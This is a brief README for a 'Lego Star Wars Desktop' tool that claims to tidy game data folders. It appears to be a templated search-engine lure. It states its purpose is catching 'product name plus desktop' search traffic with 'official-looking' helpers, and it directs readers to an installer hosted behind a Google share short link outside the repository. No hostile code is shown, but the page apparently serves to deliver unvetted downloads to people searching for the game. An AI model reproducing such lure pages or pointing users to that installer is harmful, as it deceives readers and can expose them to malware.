# Lego Star Wars Desktop

*Keep the Lego Star Wars data folder tidy before an update.*

## Overview

This repository is **Lego Star Wars Desktop**, a Windows utility. Keep the Lego Star Wars data folder tidy before an update.

Patches move Lego Star Wars data paths without warning.

It runs on the local PC. No account, and nothing is uploaded.

## Editions

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## Features

- Locates Lego Star Wars user data on Windows and macOS.
- Archives data folders without touching the live install.
- Optional preview so nothing is written until you say so.
- Prints the paths it used.

## Why it exists

Search traffic for Lego Star Wars is the product name plus desktop.

Keep one official-looking helper per title.

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.
